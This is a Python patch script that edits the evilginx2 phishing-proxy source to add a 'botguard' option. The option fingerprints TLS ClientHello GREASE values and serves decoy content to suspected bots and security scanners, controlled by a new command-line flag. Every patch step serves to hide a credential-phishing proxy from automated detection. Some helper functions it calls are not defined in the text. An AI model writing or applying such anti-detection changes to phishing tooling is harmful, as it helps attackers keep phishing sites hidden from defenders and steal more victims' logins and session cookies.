#!/usr/bin/env python3
# patch_botguard.py — wire bot detection into the proxy + CLI flag. Run in ~/evilginx2-src.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit(f"[abort] {path}: pattern found {n}x (need exactly 1):\n{old[:140]}")
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print(f"[patch] {path} OK")

# 1) struct fields (developer bool is the last field in the struct block)
patch("core/http_proxy.go",
      "\tdeveloper         bool\n",
      "\tdeveloper         bool\n"
      "\tbotguard          bool\n"
      "\tbg_grease         map[string]bool\n"
      "\tbg_mtx            sync.Mutex\n")

# 2) init fields in NewHttpProxy
patch("core/http_proxy.go",
      "\tp.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable\n",
      "\tp.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable\n"
      "\tp.botguard = false\n"
      "\tp.bg_grease = make(map[string]bool)\n")

# 3) httpsWorker: peek ClientHello before vhost sniffs SNI
patch("core/http_proxy.go",
      "\t\t\ttlsConn, err := vhost.TLS(c)\n",
      "\t\t\trc := newPeekConn(c)\n"
      "\t\t\tp.noteHelloGrease(rc.RemoteAddr().String(), rc.Reader)\n"
      "\t\t\ttlsConn, err := vhost.TLS(rc)\n")

# 4) DoFunc: bot check before anything else
patch("core/http_proxy.go",
      "\t\t\t// handle ip blacklist\n",
      "\t\t\tif p.isBotRequest(req) {\n"
      "\t\t\t\treturn p.decoyRequest(req)\n"
      "\t\t\t}\n"
      "\n"
      "\t\t\t// handle ip blacklist\n")

# 5) main.go — CLI flag + enable call
patch("main.go",
      'var api_port = flag.Int("api", 0, "Enable HTTPS REST API with client certificate auth on the given port")\n',
      'var api_port = flag.Int("api", 0, "Enable HTTPS REST API with client certificate auth on the given port")\n'
      'var botguard_mode = flag.Bool("botguard", false, "Serve decoy content to suspected bots/scanners")\n')
patch("main.go",
      "\thp.Start()\n",
      "\thp.SetBotguard(*botguard_mode)\n"
      "\thp.Start()\n")

print("[done] botguard patches applied")
